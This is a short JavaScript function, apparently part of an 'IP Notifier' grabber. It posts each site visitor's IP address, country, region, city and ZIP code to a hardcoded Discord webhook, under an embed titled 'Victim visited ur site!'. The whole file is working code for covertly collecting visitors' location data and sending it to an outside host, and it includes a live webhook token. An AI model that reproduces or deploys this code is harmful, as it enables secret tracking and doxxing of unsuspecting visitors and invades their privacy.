function logs(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "https://discordapp.com/api/webhooks/1161346393005371473/i0cnlUE8Zjl_po_EYIvfa8cr_TNh0pS730lza2boqUK-cIze_0xMqZspcsod4dCB1Mnv");

     request.setRequestHeader("Content-type", "application/json");

     var params = 
     {
          username: "L1ght's IP Notifier | Beta",
          avatar_url: "https://media.discordapp.net/attachments/1060890977474183193/1077955575498940487/lfP5YqEQB4Z8QAAAAASUVORK5CYII.png",
          content: "**L1ght On Top**",
          embeds: [
               {
                    title: "Victim visited ur site!",
                    color: 00000,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}